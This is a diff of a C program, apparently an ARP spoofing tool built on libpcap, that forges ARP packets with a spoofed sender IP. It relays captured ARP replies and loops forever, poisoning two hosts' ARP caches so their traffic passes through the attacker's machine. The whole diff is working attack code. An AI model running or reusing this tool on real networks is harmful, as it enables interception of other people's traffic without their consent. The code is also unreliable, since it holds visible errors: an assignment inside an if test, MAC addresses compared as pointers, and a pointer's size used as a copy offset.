@@ -28,14 +28,14 @@ struct arp_hdr
 
 
 
-bool arp_request_infection(pcap_t *handle,uint8_t *mymac ,u_int32_t *my_ip, in_addr *target)
+bool arp_request_infection(pcap_t *handle,uint8_t *mymac ,u_int32_t *my_ip, in_addr *_senderip,uint8_t *_sendermac,in_addr *_targetip,uint8_t *_targetmac, int flag)
 {
 
     u_char *packet;
     libnet_ethernet_hdr ethernet_hdr;
     arp_hdr arp_req_hdr;
     packet =(u_char *) malloc(sizeof(ethernet_hdr) + sizeof(arp_req_hdr));
-    memset(ethernet_hdr.ether_dhost,0xff,6);
+
     memcpy(ethernet_hdr.ether_shost,mymac,6);
     ethernet_hdr.ether_type = htons(ETHERTYPE_ARP);
     arp_req_hdr.ar_hln = 6;
@@ -43,10 +43,23 @@ bool arp_request_infection(pcap_t *handle,uint8_t *mymac ,u_int32_t *my_ip, in_a
     arp_req_hdr.ar_hrd = htons(ARPHRD_ETHER);
     arp_req_hdr.ar_pro = htons(ETHERTYPE_IP);
     arp_req_hdr.ar_op = htons(ARPOP_REQUEST);
-    memcpy(arp_req_hdr.ar_sender_ip,my_ip,4);
-    memcpy(arp_req_hdr.ar_sender_mac,mymac,6);
-    memcpy(arp_req_hdr.ar_target_ip,target,4);
-    memset(arp_req_hdr.ar_target_mac,0,6);
+    if(flag == 1)
+    {
+        memset(ethernet_hdr.ether_dhost,0xff,6);
+        memcpy(arp_req_hdr.ar_sender_ip,my_ip,4);
+        memcpy(arp_req_hdr.ar_sender_mac,mymac,6);
+        memcpy(arp_req_hdr.ar_target_ip,_targetip,4);
+        memset(arp_req_hdr.ar_target_mac,0,6);
+
+    }
+    else if(flag == 2)
+    {
+        memcpy(ethernet_hdr.ether_dhost,_targetmac,6);
+        memcpy(arp_req_hdr.ar_sender_ip,_senderip,4);
+        memcpy(arp_req_hdr.ar_sender_mac,mymac,6);
+        memcpy(arp_req_hdr.ar_target_ip,_targetip,4);
+        memcpy(arp_req_hdr.ar_target_mac,_targetmac,6);
+    }
 
     memcpy(packet,&ethernet_hdr,sizeof(ethernet_hdr));
     memcpy(packet+sizeof(ethernet_hdr),&arp_req_hdr, sizeof(arp_req_hdr));
@@ -73,37 +86,27 @@ bool recive_packet(const u_char *packet,uint8_t *mac)
     return false;
 }
 
-bool infection(pcap_t *handle,uint8_t *mymac ,uint32_t *my_ip, in_addr *_senderip,in_addr *_targetip,uint8_t *_targetmac)
+bool relay(pcap_t *p_handle,const u_char *packet,uint8_t *_mymac,uint8_t *_targetmac, uint8_t *_recvmac)
 {
-    u_char *packet;
-    libnet_ethernet_hdr ethernet_infection;
-    arp_hdr arp_req_infection;
-    packet =(u_char *) malloc(sizeof(ethernet_infection) + sizeof(arp_req_infection));
-    //recv infection
-    memcpy(ethernet_infection.ether_dhost,_targetmac,6);
-    memcpy(ethernet_infection.ether_shost,mymac,6);
+    u_char *buffer;
+    libnet_ethernet_hdr *relay_ethernet = (libnet_ethernet_hdr *)(packet);
+    arp_hdr *relay_arp = (arp_hdr *)(packet + sizeof(libnet_ethernet_hdr));
+    if(relay_arp->ar_op == htons(ARPOP_REPLY))
+    {
+    memcpy(relay_ethernet->ether_shost,_mymac,6);
+    memcpy(relay_arp->ar_sender_mac,_mymac,6);
+    if(relay_ethernet->ether_shost == _recvmac)
+    memcpy(relay_ethernet->ether_dhost,_targetmac,6);
+    else if(relay_ethernet->ether_dhost == _targetmac)
+    memcpy(relay_ethernet->ether_dhost,_recvmac,6);
+    buffer = (u_char *)malloc(sizeof(*relay_ethernet) + sizeof(*relay_arp));
+    memcpy(buffer,relay_ethernet,sizeof(libnet_ethernet_hdr));
+    memcpy(buffer + sizeof(relay_ethernet),relay_arp,sizeof(*relay_arp));
+    pcap_sendpacket(p_handle,buffer,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));
+    }
 
-    ethernet_infection.ether_type = htons(ETHERTYPE_ARP);
-    arp_req_infection.ar_hln = 6;
-    arp_req_infection.ar_pln = 4;
-    arp_req_infection.ar_hrd = htons(ARPHRD_ETHER);
-    arp_req_infection.ar_pro = htons(ETHERTYPE_IP);
-    arp_req_infection.ar_op = htons(ARPOP_REQUEST);
 
-    memcpy(arp_req_infection.ar_sender_ip,_senderip,4);
-    memcpy(arp_req_infection.ar_sender_mac,mymac,6);
-    memcpy(arp_req_infection.ar_target_ip,_targetip,4);
-    memcpy(arp_req_infection.ar_target_mac,_targetmac,6);
-    memcpy(packet,&ethernet_infection,sizeof(ethernet_infection));//
-    memcpy(packet+sizeof(ethernet_infection),&arp_req_infection, sizeof(arp_req_infection));//
-    pcap_sendpacket(handle,packet,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));//
-    if(sizeof(packet) != NULL)
-        return true;
 
-    return false;
-}
-bool relay()
-{
 }
 bool recovery()
 {
@@ -157,7 +160,7 @@ int main(int argc, char *argv[])
 
     //request
     buffer = (u_char *)(malloc(sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr)));
-    if(arp_request_infection(p_handle,mymac->ether_addr_octet ,&myip, &recvip) == true)
+    if(arp_request_infection(p_handle,mymac->ether_addr_octet ,&myip,0,0,&recvip,recvmac,1) == true)
     {
 
 
@@ -168,7 +171,7 @@ int main(int argc, char *argv[])
             if(recive_packet(buffer,recvmac) == true)
             {
 
-                infection(p_handle,mymac->ether_addr_octet, &myip, &targetip,&recvip,recvmac);
+
                 break;
             }
         }
@@ -177,7 +180,7 @@ int main(int argc, char *argv[])
     else
         printf("failing recv mac get\n");
 
-    if(arp_request_infection(p_handle,mymac->ether_addr_octet ,&myip, &targetip) == true)
+    if(arp_request_infection(p_handle,mymac->ether_addr_octet ,&myip,0,0,&targetip,targetmac,1) == true)
     {
         while(1)
         {
@@ -185,25 +188,29 @@ int main(int argc, char *argv[])
             pcap_next_ex(p_handle,&header,&buffer);
             if(recive_packet(buffer,targetmac) == true)
             {
-                infection(p_handle,mymac->ether_addr_octet, &myip, &recvip,&targetip,targetmac);
                 break;
             }
 
         }
-
-
-        printf("!");
-
-
-
-
-
     }
     else
         printf("failing target mac get\n");
-
-
     //infection
+    int setting = 0;
+    printf("packet infection?((yes  : 1)\n");
+    scanf("%d",&setting);
+    if(setting =1)
+    {
+        while(setting)
+        {
+        arp_request_infection(p_handle,mymac->ether_addr_octet, &myip, &targetip,targetmac,&recvip,recvmac,2);
+        arp_request_infection(p_handle,mymac->ether_addr_octet, &myip, &recvip,recvmac,&targetip,targetmac,2);
+        sleep(2);
+        }
+    }
+
+
+
 
 
     printf("!!\n");
